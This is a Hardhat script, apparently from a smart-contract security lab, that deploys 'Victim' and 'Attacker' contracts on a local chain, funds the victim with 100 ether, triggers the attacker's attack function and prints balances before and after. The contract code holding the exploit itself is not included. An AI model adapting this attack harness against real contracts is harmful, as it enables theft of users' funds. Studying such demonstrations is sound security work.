const hre = require("hardhat");
const { waffle } = require("hardhat");

import { Signer } from "ethers";

const ethers = hre.ethers;

async function main() {
    const provider = waffle.provider;
    let Victim, victim, Attacker, attacker;
    let user: Signer, hacker: Signer;

    [user, hacker] = await ethers.getSigners();

    Victim = await hre.ethers.getContractFactory("Victim", user);
    victim = await Victim.deploy();
    await victim.deployed();

    let overrides = { value: ethers.utils.parseEther("2") }

    Attacker = await hre.ethers.getContractFactory("Attacker", hacker);
    attacker = await Attacker.deploy(overrides);
    await attacker.deployed();

    let tx = {
        from: await user.getAddress(),
        to: victim.address,
        value: ethers.utils.parseEther("100")
    }
    await user.sendTransaction(tx);

    console.log("Before Attack\n----------------------------")
    console.log("Attacker Balance:", await ethers.utils.formatEther(await provider.getBalance(attacker.address)));
    console.log("Victim Balance:", await ethers.utils.formatEther(await provider.getBalance(victim.address)));

    console.log('\n\nNow attack start\n\n');

    await attacker.connect(hacker).setVictim(victim.address);
    await attacker.connect(hacker).attack(await ethers.utils.parseEther("1.999"));

    console.log("\nAfter the attack");
    console.log("Attacker Balance:", await ethers.utils.formatEther(await provider.getBalance(attacker.address)));
    console.log("Victim Balance:", await ethers.utils.formatEther(await provider.getBalance(victim.address)));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });